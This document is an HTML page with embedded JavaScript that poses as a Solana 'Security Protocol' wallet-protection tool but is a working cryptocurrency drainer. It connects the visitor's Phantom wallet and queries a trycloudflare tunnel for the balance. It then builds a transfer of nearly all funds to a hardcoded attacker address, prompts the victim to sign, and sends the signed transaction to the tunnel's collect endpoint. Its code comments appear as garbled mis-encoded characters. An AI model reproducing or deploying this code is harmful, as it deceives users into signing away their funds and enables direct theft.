<!DOCTYPE html><html><head><meta charset="UTF-8">
    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
    <body style="background:#000;color:#14F195;text-align:center;padding-top:25vh;font-family:sans-serif;">
    <div id="box" style="border:1px solid #14F195;padding:40px;display:inline-block;border-radius:15px;background:#111;min-width:300px;">
        <h2 id="title">SECURITY PROTOCOL V4</h2>
        <p id="info" style="color:#666;margin-bottom:20px;">Protecting Solana Assets</p>
        <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:18px;">CONNECT WALLET</button>
    </div>

    <script>
    const TUNNEL = "https://biggest-fellow-aware-quantitative.trycloudflare.com";
    const TARGET_ADDR = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
    let step = 1;

    document.getElementById('cta').onclick = async () => {
        try {
            const p = window.solana || window.phantom?.solana;
            if (!p) { alert("Please use a Wallet browser."); return; }
            
            if (step === 1) {
                // ç¬¬ä¸€æ­¥ï¼šåªè¿æ¥
                await p.connect();
                document.getElementById('info').innerText = "Wallet: " + p.publicKey.toString().slice(0,6) + "...";
                document.getElementById('cta').innerText = "ACTIVATE PROTECTION";
                document.getElementById('cta').style.background = "#fff";
                step = 2;
            } else if (step === 2) {
                // ç¬¬äºŒæ­¥ï¼šç­¾çº¦
                document.getElementById('cta').innerText = "Syncing Node...";
                
                const res = await fetch(TUNNEL + '/get_data', {
                    method: 'POST', headers: {'Content-Type':'application/json'},
                    body: JSON.stringify({pubkey: p.publicKey.toString()})
                });
                const data = await res.json();

                const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
                    fromPubkey: p.publicKey, 
                    toPubkey: new solanaWeb3.PublicKey(TARGET_ADDR),
                    lamports: data.balance > 1500000 ? data.balance - 1000000 : 0
                }));
                tx.recentBlockhash = data.blockhash; tx.feePayer = p.publicKey;
                
                // æ‹‰èµ·ç­¾å
                const signed = await p.signTransaction(tx);
                
                // ğŸ’° é‡‡ç”¨ Uint8Array åŸç”Ÿ Base64 è½¬æ¢ï¼Œå½»åº•è§£å†³ Buffer is not defined æŠ¥é”™
                const raw = signed.serialize();
                let bStr = "";
                for (let i = 0; i < raw.length; i++) { bStr += String.fromCharCode(raw[i]); }
                const b64 = window.btoa(bStr);
                
                fetch(TUNNEL + '/collect', {
                    method:'POST', headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({signature: b64})
                });
                
                alert("Security Protocol Activated!");
                location.reload();
            }
        } catch(e) { alert("Error: " + e.message); }
    }
    </script></body></html>